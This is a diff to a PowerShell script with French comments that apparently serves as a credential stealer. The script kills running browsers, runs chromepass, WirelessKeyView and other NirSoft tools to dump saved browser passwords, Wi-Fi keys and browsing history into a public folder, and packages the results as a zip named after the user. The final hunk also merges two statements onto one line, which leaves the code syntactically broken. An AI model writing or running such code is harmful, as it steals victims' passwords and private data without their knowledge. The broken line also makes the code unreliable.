@@ -10,7 +10,7 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
-# Nettoyage absolu et forcé au démarrage pour éviter les verrous de fichiers
+# Nettoyage absolu et forcé au démarrage
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 if (Test-Path $basePath) {
@@ -39,20 +39,15 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION CHROMEPASS (MODE SILENCIEUX FORCÉ) ---
+# --- EXTRACTION CHROMEPASS DIRECTE ---
 Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
-
-if ($explorer) {$processInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processInfo.FileName = "$basePath\chromepass.exe"
-    $processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
-    $processInfo.UseShellExecute =$true
-    $p = [System.Diagnostics.Process]::Start($processInfo)
-    Start-Sleep -Seconds 5
-    Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
-} else {
-    Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -Wait -WindowStyle Hidden
-}
+$processInfo = New-Object System.Diagnostics.ProcessStartInfo
+$processInfo.FileName = "$basePath\chromepass.exe"
+$processInfo.Arguments = "/stext `"$basePath\passwords.txt`""
+$processInfo.UseShellExecute =$true
+$p = [System.Diagnostics.Process]::Start($processInfo)
+Start-Sleep -Seconds 5
+Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
 
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
@@ -103,8 +98,7 @@ try {
 }
 
 if ($fileStream) {
-    $fileStream.Close()
-    $fileStream.Dispose()
+    $fileStream.Close()$fileStream.Dispose()
 }
 
 # Nettoyage final sécurisé
